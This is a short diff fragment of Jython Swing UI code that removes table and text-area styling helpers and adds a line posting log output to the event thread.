-        t.setFont(Font("Monospaced", Font.PLAIN, 11))
-        t.getTableHeader().setBackground(C_BG)
-        t.getTableHeader().setForeground(C_ACCENT)
-        t.getTableHeader().setFont(Font("Monospaced", Font.BOLD, 11))
-        t.setRowHeight(22)
-        t.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
-        return t
-
-    def _textarea(self):
-        a = JTextArea()
-        a.setBackground(C_BG)
-        a.setForeground(C_TEXT)
-        a.setFont(Font("Monospaced", Font.PLAIN, 11))
-        a.setEditable(False)
-        a.setLineWrap(True)
-        a.setWrapStyleWord(True)
-        a.setBorder(BorderFactory.createEmptyBorder(8, 10, 8, 10))
-        return a
+        swing.SwingUtilities.invokeLater(RLog(self, line))
